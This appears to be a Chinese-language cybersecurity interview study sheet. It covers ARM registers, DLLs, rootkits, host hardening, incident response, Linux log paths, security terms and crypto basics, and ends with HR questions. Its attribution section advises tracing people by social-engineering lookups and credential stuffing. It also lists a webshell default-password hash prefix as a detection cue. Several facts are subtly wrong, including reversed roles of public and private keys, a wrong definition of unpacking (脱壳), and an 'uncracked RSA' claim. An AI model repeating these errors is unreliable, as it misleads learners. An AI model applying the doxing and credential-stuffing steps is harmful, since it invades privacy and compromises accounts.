在 ARM32 位指令集中，返回值通常保存在寄存器 R0 中，而返回地址则保存在寄存器 LR（链接寄存器）中
	1- 返回值：函数调用结束后返回值通过 R0 寄存器返回给调用者，若返回值大小超过单个寄存器能够容纳的范围，将采用其他寄存器或内存来存储返回值
	- 返回地址：函数调用时调用指令将返回地址存储在链接寄存器 LR 中，当函数执行完毕并准备返回时使用 BX LR 指令将控制权返回到调用者，且程序从 LR 中读取返回地址，并继续执行调用指令后的代码
# 需注意，ARM 32 位指令集的通用惯例，不代表所有情况。在某些特殊情况下返回值和返回地址的保存位置可能有所不同。此外具体的编译器和编程语言也可能对返回值和返回地址的管理方式有所差异。在实际开发中可能需要参考具体的编译器和文档了解关于返回值和返回地址的更详细信息
```

### 00x02 DLL 文件用途

```shell
# DLL（Dynamic Link Library，动态链接库） Windows 系统常见可执行文件格式，包含可重用代码、数据和资源的动态链接库，用于多个应用程序间共享功能和资源
DLL 文件的主要用途如下：
	1- 代码共享：将常用代码封装在 DLL 文件中，多个应用程序可共享代码从而减少重复开发工作，可提高开发效率、减少代码冗余、简化维护和更新过程
	2- 功能扩展：应用程序可加载 DLL 文件获得额外功能和功能扩展，使用DLL文件开发人员可将新功能添加到应用程序中，而无需修改和重新编译整个应用程序
	3- 动态链接：DLL 文件在运行时可由应用程序动态链接，即 DLL 文件中的函数和资源可在需要时加载到内存中供应用程序使用，动态链接的方式有助减小应用程序的内存占用，提供更好的资源利用和灵活性
	4- 多语言支持：DLL 文件可包含多种语言编写的代码，开发人员可使用不同的编程语言来编写 DLL 文件，以满足应用程序的需求。如一个应用程序可以使用 C++ 编写 DLL 文件，同时使用 C#、VB.NET 等编程语言进行开发

提高程序的复用性：可将公共代码封装在 DLL 文件中，供多个程序使用，避免重复编写代码
促进并行开发：小组成员可定义好 DLL 输出的接口函数，方便多个小组协同开发
增强软件的灵活性：可通过修改相应的 DLL 文件实现需求变量的修改，而不需重新编译整个程序
提高程序的安全性：DLL 文件可被多个程序共享，减少程序中的重复代码，降低程序的漏洞风险
```

### 00x03 Rootkit

```shell
# Rootkit 一种恶意软件，旨在隐藏或掩盖攻击者在受感染系统中存在的迹象和活动，常作为攻击者进一步渗透系统、维持访问权限和掩盖恶意活动的手段之一
# Rootkit 可在操作系统内核层面或用户空间操作系统组件中植入恶意代码，通过修改操作系统或应用程序的核心组件和文件以欺骗系统管理员和安全工具，隐藏其存在和活动，这使得攻击者能够在系统中持久地存在、绕过安全检测和避免被发现
常见 Rootkit 技术包括：
	1- Hooking（钩子）：通过修改核心操作系统功能的 API 函数，使其重定向到恶意代码，以控制和操纵系统的行为
	2- 操作系统内核模块：通过植入恶意代码到操作系统内核或核心模块中，Rootkit 可在更低的层面上操作系统进行控制并隐藏自身存在
	3- 驱动程序：植入操作系统的设备驱动程序中允许 Rootkit 在系统启动时加载，并在系统运行期间以最高权限运行
	4- 用户空间 Rootkit：通过修改用户空间应用程序或系统工具以隐藏自己的存在、隐藏文件和进程，并操纵系统行为
# Rootkit 常用于黑客攻击、间谍活动和恶意软件的传播，目标可能是窃取敏感信息、控制受感染系统、进行网络攻击或进行其他恶意活动
# 要检测和清除 Rootkit，需使用反 Rootkit 工具和安全软件，这些工具会扫描系统以发现和清除潜在 Rootkit 感染。及时更新操作系统和应用程序，限制系统管理员访问权限，使用有效的安全解决方案，也是预防和应对 Rootkit 的重要措施
```

## 溯源 附加

```
IP 溯源是否绑定域名/邮箱，通过邮箱反查 QQ，社工查询手机号，通过手机号查询注册网站，撞库登录查询身份等信息
```

### 00x00

## 系统加固 附加

### 00x00 加固方案

```shell
- 漏扫工具、加固脚本；
- 系统安全配置、中间件配置、网络规则配置；
```

### 00x01 主机加固

```shell
# Windows 加固
1- 修改常用端口，如 3389
2- 设置安全策略，不允许 SAM 账户的匿名枚举、和共享的匿名枚举
3- 组策略中设置组阻止访问注册表编辑工具
4- 开启审核对象访问
5- 开启审核目录服务访问
6- 开启审核系统事件
7- 禁用服务端口，如 445
8- 设置屏幕保护在恢复时使用密码保护
9- 设置 Windows 密码策略，使密码满足复杂性，密码长度最小 8 位，最长留存期 30 天
10- 开启 Windows 防火墙，关闭 ping，关闭不必要服务(3389/80)

# Linux 加固
1- 修改 ssh 配置文件，禁止 root 直接登录
2- 修改密码策略配置文件，确保密码最小长度为 8 位
3- 确保错误登录 3 次 锁定账户 5 分钟
4- 禁止 su 非法提权，只允许 root 和 wheel 组用户 su 到 root
5- 不响应 ICMP 请求
6- 设置登录超时时间为 10 分钟
7- 结束非法登录用户
```

## 应急响应 附加

### 00x00 应急思路

```
- 查看日志记录情况，IP/时间/事件(恶意流量或恶意访问日志)/作用
- 清理后门/修复
```

### 00x00 Web 服务器被入侵后如何排查

```shell
# 当发现 Web 服务器被入侵后，以下是一些常见的排查步骤：
1. 确认入侵：首先，确认是否真的存在入侵。检查服务器的日志文件，包括访问日志、错误日志和系统日志，寻找异常的活动记录或异常的网络连接。
2. 隔离受影响的服务器：一旦发现入侵，立即从网络中隔离受影响的服务器。这样可以阻止攻击者对其他系统或数据的进一步访问。
3. 收集证据：在进行任何操作之前，务必先收集证据。这包括保留相关日志文件、截屏、记录异常行为等。这些证据在事后的调查和法律追诉中可能起到重要作用。
4. 安全扫描：运行安全扫描工具来检测服务器的漏洞和弱点。这可以帮助找出可能被入侵者利用的安全漏洞或后门。
5. 恢复受感染的系统备份：如果有可用的备份，可以考虑重新构建受影响的服务器。确保备份是受信任且不受感染的。
6. 弥补漏洞：找出被利用的漏洞并进行修补。这可能涉及到安装系统和应用程序的安全更新、修复配置错误、更新密码、限制访问等一系列操作。
7. 清除恶意软件：扫描服务器以查找和清除可能存在的恶意软件或后门程序。使用安全工具来扫描服务器的文件系统和注册表，以确保系统干净。
8. 密码和访问控制管理：重置被入侵的用户帐户和管理员密码，并重新评估服务器的访问控制策略。确保只有授权的人员能够访问服务器。
9. 安全加固：对服务器进行安全加固，如关闭不必要的服务、配置入侵检测系统和防火墙、限制远程访问等。确保服务器的安全配置符合最佳实践。
10. 监控和审计：重点加强对服务器的监控和审计。实施实时监控系统，以便及早发现任何潜在的入侵活动，并记录所有关键的系统事件和日志。
# 请注意，此处的排查步骤是针对一般情况而言。严重的入侵可能需要更复杂和深入的排查和恢复过程。在处理入侵事件时，建议与安全专家或公司合作，确保有效解决问题，并采取预防措施以避免今后再次发生类似事件。
```

### 00x01 主机被入侵如何自查处理

```shell
# 若主机被入侵，以下是自查解决方案：
1. 断开与网络的连接：立即断开被入侵主机与网络的连接，以防止入侵者继续获取敏感信息或进一步破坏系统
2. 收集日志和证据：保留被入侵主机的日志文件和相关证据，可帮助事后分析事件以了解入侵的方式和入侵者的活动
3. 确认入侵类型和范围：调查和分析入侵的类型和范围，了解入侵者已获取权限和资源及可能对系统造成的损害
4. 按照应急响应计划进行处理：根据组织的应急响应计划启动相应的步骤来处理入侵，可能包括通知安全团队、上报事件、开始恢复流程等
5. 隔离和清除受感染的主机：隔离被入侵的主机以防止已感染的系统对其他主机产生影响，对受感染系统进行清除和修复，恢复到安全状态
6. 加强安全措施：分析入侵的原因和漏洞，采取适当的补救措施来加强安全。可能包括修补漏洞、更新安全补丁、实施入侵检测系统等
7. 更新密码和权限：更改所有相关用户的密码，审查和更新系统中的权限设置，确保仅有授权用户可访问系统
8. 重新评估安全策略和防御措施：对现有安全策略和防御措施全面评估，确定改进方向和潜在薄弱环节，防止未来入侵事件再次发生
# 请注意，上述解决方案只是一般性建议，实际处理方案可能会根据入侵性质、组织类型和安全策略等因素而有所不同。在处理主机入侵时，建议尽早联系专业的安全团队或IT支持人员以获取更准确的指导和帮助。
```

### 00x02 手工查找后门木马技巧

```shell
1- 检查系统日志
2- 检查进程列表
3- 检查文件系统
4- 检查注册表
5- 检查网络连接
6- 检查系统配置
7- 检查系统安全设置
8- 检查系统启动项
# 使用安全扫描工具/检查系统补丁/检查系统更新
```

### 00x03 安全产品如何预判报警

```shell
# 大流量环境下，如何快速对报警进行判断
	- 看时间、源目的资产是否异样

# 对于安全设备告警事件如何判断是否为误报的方法与思路
	- 看发生时间、告警内容特征、手动验证，根据告警信息查询、完整流量日志、验证

# 如何区分扫描流量和手动流量
	- 扫描数据量大，请求流量有规律可循；手动流量请求少，间隔略长
```

### 00x04 不提供工具如何 webshell 查杀

```shell
1- cat/grep/awk 等命令查看日志、手工检索/分析可疑文件；
2- top/ps/netstat 等命令查看进程、网络状况追溯恶意进程/攻击IP；
3- 排查开机启动项、计划任务(/etc/crontab)、日志(lastlog)、可疑用户等；
```

### 00x05 被 shell 如何处理

```shell
# PDCERF模型
1- Prepare（准备）：准备用来检测的工具和人
2- Detection（检测）：紧急事件监测：包括防火墙、系统、web服务器、IDS/WAF/SIEM中的日志，不正常或执行越权操作的用户，甚至还有管理员的报告
3- Containment（抑制）：首先控制受害范围，阻止攻击蔓延到其他 IT 资产和业务环境，封堵后门。寻找根源原因，彻底解决，封堵攻击源，恢复业务
4- Eradication（根除）
5- Recover（恢复）
6- Follow-Up（跟踪）：根据各种监控确定无其他攻击行为和攻击向量，开会反省此次事件，写报告，持续改进工作流程和工作环节
# 简答排查、清除、看看可有即使修复的可能，不得已就关站
```

### 00x06 webshell 防范

```shell
将专门存放上传文件的文件夹里面的脚本类型文件，解析成其他类型的文件，服务器不会以脚本类型来执行它。
匹配文件夹里的脚本类型文件，将其设置为无法读取及操作。
将文件上传到一个单独的文件夹，给一个二级的域名，然后不给这个虚拟站点解析脚本的权限，听说很多网站都用这种方式。
```

### 00x07 ps 被禁如何处理

```shell
恢复配置文件，执行进程查看命令，杀进程
```



## 系统日志 附加

### 00x00 系统日志位置

```shell
# Windows：
	1- Application 事件日志：包含应用程序的详细日志信息，如应用程序的启动和停止、异常等
	2- System 事件日志：记录系统级别的日志事件，如启动和停止事件、硬件或软件驱动程序事件等
	3- Security 事件日志：记录与安全相关的日志事件，如登录和注销、权限更改等
	4- Setup 事件日志：记录安装和卸载软件、硬件更改等事件
	5- 筛选不需要的事件日志：除以上四个主要的日志类型外，可根据需要筛选不需要的事件日志
# Linux：
	1- 系统日志：位于 /var/log/syslog 文件中，记录系统级别的日志信息
	2- 应用程序日志：位于 /var/log/application.log 文件中，记录应用程序的详细日志信息
	3- 安全日志：位于 /var/log/secure 文件中，记录与安全相关的日志事件
	4- 消息日志：位于 /var/log/messages 文件中，记录系统消息和重要的系统事件
	5- 传输日志：位于 /var/log/xferlog 文件中，记录文件传输事件
	6- 日志滚动：使用 logrotate 工具进行日志滚动，避免日志文件过大影响系统性能
# 需注意，在进行日志清理前，建议先备份原始日志文件，以防止数据丢失或损坏。同时应根据系统和应用程序的需求来确定何时进行日志清理
```

### 00x01 Linux 日志

```
/var/log/cron     记录系统定时任务相关的日志
/var/log/cups     记录打印信息的日志
/var/log/dmesg    记录系统开机时内核自检信息，dmesg 命令可查看内核自检信息
/var/log/mailog   记录邮件信息
/var/log/message  记录系统绝大多数重要信息日志
/var/log/btmp     记录错误登录日志，二进制文件，不能直接 vi 查看，可 lastb 命令查看
/var/log/lastlog  记录系统中所有用户最后一次登录时间的日志，二进制文件，不能直接 vi，可 lstlog 命令查看
/var/log/wtmp     永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。二进制文件，不能直接 vi，可 last 命令来查看
/var/log/utmp     记录当前已登录的用户信息，会随用户登录和注销变化。不能直接 vi，可 w,who,users 等命令查看
/var/log/secure   记录验证和授权方面的信息，只涉及账号和密码的程序，如 SSH 登录、su 切换用户、sudo 授权，添加用户和修改用户密码等
```

### 00x02 Linux 命令

```shell
grep 			# 过滤信息
netstat -ant 	# 查看当前网络连接状况
netstat -ant |grep "etablished" # 正在建立连接
ps 				# 查看进程
ps -ef 			# 查看进程使用的文件
```

## 安全相关了解

### 00x00

```shell
# 网络钓鱼（Phishing）
指通过虚假电子邮件、即时通讯等方式诱骗用户点击链接或下载附件，达到非法获取用户个人信息或控制用户电脑的目的。通常伪装成银行、电商、邮箱等官方网站骗取用户的账号、密码、信用卡信息等

# 震网病毒（Stuxnet）
一款针对工业控制系统的恶意软件，于 2010 年首次被发现，主要针对伊朗的核电站，可通过感染工业控制系统的计算机，从而控制工业设备，造成严重的破坏。

# 蜜罐(honeypot) 
一种用來捕捉入侵者的电脑系統，通常伪装成有价值的目标以吸引入侵者进入并被捕获。可用來收集入侵者信息，如使用的工具、技能及试图攻击的系統。也可用來阻止入侵者，攻击者可能会认为蜜罐是真正的目标且不会继续攻击其他系統

# CC 攻击
(也称为拒绝服务攻击) 是一种试图使网站或服务不可用的方法。攻击者通常向目标发送大量流量，以使其超载并无法处理正常的流量。可由个人或组织发动，且可对企业造成重大损失

# DDOS
(分布式拒绝服务攻击) 是一种试图使网站或服务不可用的方法。攻击者通常会使用多个计算机来发送大量流量到目标，以使其超载并无法处理正常的流量。DDoS 攻击可以由个人或组织发动，且可对企业造成重大损失

# DDOS 防护
	1- 流量清洗：通过过滤、丢弃或重定向恶意流量，来保护目标服务器或网络
	2- 负载均衡：将来自多个客户端的请求分发到多个服务器，以提高服务器的处理能力
	3- 防火墙：在网络中设置一道屏障，以阻止恶意流量进入网络
	4- 入侵检测系统：通过监控网络流量，检测和阻止恶意攻击

# 人肉搜索
(也称为反向搜索) 是一种搜索有关某人或某事资讯的方法，通过网上搜索姓名、地址或其他个人资讯。如有关某人个人资讯，如电话号码、电子邮件地址、社交媒体账户、犯罪记录或财务状况
 
# 脱壳
又称脱离壳，是指计算机病毒在感染计算机后将自己的代码注入到宿主程序中，并在宿主程序运行时执行从而实现自身的传播和感染。脱壳技术是病毒的一种常见手段，可帮助病毒躲避杀毒软件的检测，并提高病毒的传播能力
 
# 手机"越狱"
指通过修改手机系统的权限，使手机可安装非官方应用程序。越狱后手机功能会得到很大提升，可安装各种各样的应用程序，但也存在一定风险，如手机可能会被黑客入侵
 
# 宏病毒
一种通过宏语言编写的病毒，可感染各种各样的文档，如 Word、Excel、PowerPoint 等。通常会在用户打开被感染的文档时自动运行，并在用户电脑上进行恶意操作，如删除文件、修改系统设置等
 
# APP 加壳
指在 APP 的二进制文件中插入一段代码，以保护 APP 的代码不被反编译。加壳后 APP 的代码会被加密，通过特定解壳工具才能解密。加壳可防止 APP 被反编译，也会增加 APP 的体积和运行时间
 
# 0day 漏洞
指被发现后立即被利用的安全漏洞。0day漏洞是安全领域的一个术语，指的是被发现后立即被恶意利用的安全漏洞。0day漏洞的威胁在于其具有未知性和突发性，往往令安全机构和厂商措手不及，难以有效防范和应对

# 安全设备
入侵防御系统IPS、防火墙、数据库审计系统、日志审计系统、态势感知平台、WAF、蜜罐等

# IDR 敏感数据发现与风险评估系统 Insightfor Discovery and Risk

# 获取网络安全知识途径
安全社区、SRC 平台、安全群、知识星球

# Linux md5 计算命令
md5sum

# 报告思路
时间、地点、人物、源/目的IP、事件类型、漏洞类型、详细信息

# E45 开头16 位md5 值 (可变，默认密码 Rebeyond 的md5)
```

## 对称/非对称加密

```shell
# 对称加密
加密解密用同一个密钥
 
# 非对称加密
即公钥和私钥，公钥用于加密，私钥用于解密。非对称加密机制的特点是，公钥是公开的，任何人都可以获得，而私钥是保密的，只有拥有私钥的人才能解密
发送方生成一对密钥，公钥和私钥；发送方将公钥公开，而私钥保密；接收方获得发送方的公钥；发送方使用自己的私钥对数据进行加密；接收方使用发送方的公钥对数据进行解密。
```

### 00x00 RSA 算法

```shell
# RSA 算法（Rivest–Shamir–Adleman algorithm）又称公钥加密算法，是目前最广泛使用的非对称加密算法，由罗纳德·李维斯特（Ronald L. Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard M. Adleman）在 1978 年提出。
RSA 算法使用一对大素数 p 和 q，相乘得到大整数 n。从 n 中选择一个整数 e，使得 e 和 (p-1)(q-1) 互质。整数 e 就是公钥，而另一个整数 d 就是私钥。
加密时，发送方使用公钥 e 和明文 M 计算密文 C：
C = M^e mod n
解密时，接收方使用私钥 d 和密文 C 计算明文 M：
M = C^d mod n
# RSA 算法安全性基于大整数分解问题。若能在合理时间内找到 p 和 q，就可计算出 d 破解 RSA 算法。目前还没任何有效方法可快速分解大整数，RSA 算法仍然是安全的
# RSA 算法有以下优点：
	1- 安全性高。RSA 算法使用大素数，因此很难破解。
	2- 可靠性高。RSA 算法已被广泛使用，且无被破解案例
	3- 效率高。RSA 算法在计算上比较高效
# RSA 算法也有以下缺点：
	1- 计算复杂度高。RSA 算法的计算复杂度比较高
	2- 通信开销大。RSA 算法的通信开销比较大
	3- 私钥管理困难。RSA 算法的私钥管理比较困难
```

### 00x01 AES ／ DES 算法

```shell
# DES 算法的具体工作步骤：
1. 密钥生成：选择和生成一个56位的密钥，经过一系列的处理得到16个子密钥，每个子密钥是48位。
2. 初始置换（Initial Permutation）：对输入的64位明文进行初始的位重排。
3. 分组：将64位的明文分为左右两个32位的部分，记作L0和R0。
4. 加密轮运算：DES算法包含16轮加密迭代，每一轮的步骤包括：右半部分R(i-1)与子密钥Ki进行异或运算，然后经过F函数得到一个32位的输出，与左半部分L(i-1)进行异或运算得到Ri，并且交换L(i-1)和Ri得到下一轮的输入L(i)=R(i-1)，R(i)=Ri。
5. 最终置换（Final Permutation）：经过16轮加密迭代后，将得到的L16和R16合并，并进行最终的位重排，得到64位的密文。
6. 密文输出：输出64位的密文。
# AES算法的具体工作步骤：
1. 密钥扩展：根据密钥长度（128位、192位或256位），生成一系列的轮密钥，用于每一轮的加密运算。
2. 初始轮：将输入的明文分块，进行初始的AddRoundKey操作，使用第一个轮密钥与明文进行异或运算。
3. 多轮运算：对于128位密钥长度，进行9轮的加密迭代，对于192位和256位密钥长度，进行11轮和13轮的加密迭代。每一轮的步骤包括：SubBytes（字节代替）操作、ShiftRows（行移位）操作、MixColumns（列混淆）操作和AddRoundKey（轮密钥加）操作。
4. 最后一轮：进行最后一轮的加密迭代，去掉MixColumns操作。
5. 密文输出：得到加密后的密文。
```

## 其他

自我介绍？

做过那些项目

有 CNVD 证书吗， 打过 CTF 吗 有排名吗

说出印象比较深刻的一次外网打点进入内网？

平时在哪里挖漏洞？都挖那些漏洞？挖了多久？主要挖那些类型的漏洞？有排名吗？

你愿意加班吗？

为什么投我们公司？

你觉得有哪些是你会别人不会的？

你最想在哪些城市发展？

证书要考哪些？
